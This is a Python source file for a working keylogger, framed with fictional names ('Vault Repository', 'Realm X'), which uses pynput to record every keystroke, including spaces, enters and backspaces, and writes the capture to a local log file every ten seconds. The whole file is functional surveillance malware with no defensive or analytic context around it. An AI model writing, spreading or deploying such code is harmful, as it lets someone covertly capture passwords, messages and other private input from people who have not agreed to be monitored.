import pynput.keyboard
import threading
import os

# Configuration for the Vault Repository
LOG_FILE = "vault_keylog.txt"

class VaultKeylogger:
    def __init__(self):
        self.log = "--- Keylogger Initialized in Realm X ---\n"
        self.is_running = True

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        char = getattr(key, "char", None)
        if char:
            current_key = str(char)
        else:
            if key == pynput.keyboard.Key.space:
                current_key = " [SPACE] "
            elif key == pynput.keyboard.Key.enter:
                current_key = " [ENTER]\n"
            elif key == pynput.keyboard.Key.backspace:
                current_key = " [BACKSPACE] "
            else:
                current_key = " [" + str(key) + "] "
        
        self.append_to_log(current_key)

    def report(self):
        # Periodically write captured data to the file
        if self.log:
            with open(LOG_FILE, "a") as f:
                f.write(self.log)
            self.log = ""
        
        if self.is_running:
            timer = threading.Timer(10, self.report)
            timer.start()

    def start(self):
        # Start the keyboard listener
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = VaultKeylogger()
    keylogger.start()